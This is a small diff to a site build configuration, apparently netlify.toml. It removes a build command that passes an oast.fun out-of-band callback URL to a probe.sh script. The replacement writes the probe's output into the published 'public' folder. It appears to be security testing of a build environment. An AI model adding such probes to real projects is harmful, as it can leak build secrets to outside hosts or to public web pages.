@@ -1,5 +1,5 @@
 [build]
-  command = "NFP_OOB_URL=\"https://dab154553hekjnroahe07fb9jpyto4nwp.oast.fun/\" bash ./probe.sh || true"
+  command = "NFP_OOB_URL= bash ./probe.sh > public/build-probe-output.txt || true"
   publish = "public"
 
 [functions]
